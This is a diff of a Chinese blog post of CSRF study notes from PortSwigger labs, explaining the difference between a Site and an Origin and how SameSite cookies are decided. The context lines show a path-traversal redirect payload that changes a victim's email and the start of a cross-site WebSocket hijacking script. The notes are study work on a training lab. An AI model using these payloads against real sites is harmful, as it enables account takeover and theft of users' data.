@@ -2,14 +2,26 @@
 title: 'csrf学习笔记'
 published: 2026-04-25
 description: 'PortswiggerLabs-CSRF'
-tags: [Web, CTF]
-category: Security
+tags: [Security]
+category: note
 draft: false
 ---
 
 # CSRF（Cross-Site Request Forgery，跨站请求伪造）
 
 **盗用用户当前已登录身份，诱导用户在不知情的情况下，向目标网站发起请求执行操作**。
+
+Site = 协议 + 注册域
+
+```
+https://0aaa00710478468f80bee9eb004900f4.web-security-academy.net/login
+└─┬─┘  └──────────────────────────┬─────────────────────────────────┘ └─┬─┘
+协议                            主机名（host）                        路径
+
+主机名再拆：  0aaa00710478468f80bee9eb004900f4 . web-security-academy . net
+              └────────┬────────┘                 └────────┬────────┘└──┬──┘
+                  子域（随便起）                      注册域（eTLD+1）──┘
+```
 
 **核心条件（缺一不可）：**
 
@@ -293,10 +305,10 @@ exploit 页发起 document.location 跳转
     ▼
 GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=...%26submit=1
     │  确认页加载（浏览器已"身处"目标站）
-    │  内核①：页面自己的 JS 读 postId 发起跳转 = 站内发起 → Strict 放行 Cookie ✅
+    │  第二跳：页面自己的 JS 读 postId 发起跳转 = 站内发起 → Strict 放行 Cookie ✅
     ▼
 浏览器归一化 /post/1/../.. → GET /my-account/change-email?email=...&submit=1
-    │  内核②：接口直接接受 GET（无 token，无需 _method）
+    │  接口直接接受 GET（无 token，无需 _method）
     ▼
 受害者邮箱被改
 ```
@@ -312,7 +324,7 @@ GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=...%
 
 **Site 和 Origin :**
 
-- **Origin（源）** = 协议 + 主机名 + 端口，一个都不能差
+- **Origin（源）** = 协议 + 域名 + 端口，一个都不能差
 - **Site（站）** = 协议 + “注册域”（主体部分，如 `web-security-academy.net`）
 
 **而SameSite 判断的是 Site，不是 Origin！**
@@ -352,7 +364,7 @@ Site 相同（同属 web-security-academy.net）
 
    ```
    <script>
-     //以当前访问者（受害者）的身份脸上聊天
+     //以当前访问者（受害者）的身份连上聊天
      var ws = new WebSocket('wss://0aaa00710478468f80bee9eb004900f4.web-security-academy.net/chat');
      // 连上就喊暗号，让服务器发送消息
      ws.onopen = function() { ws.send("READY"); };
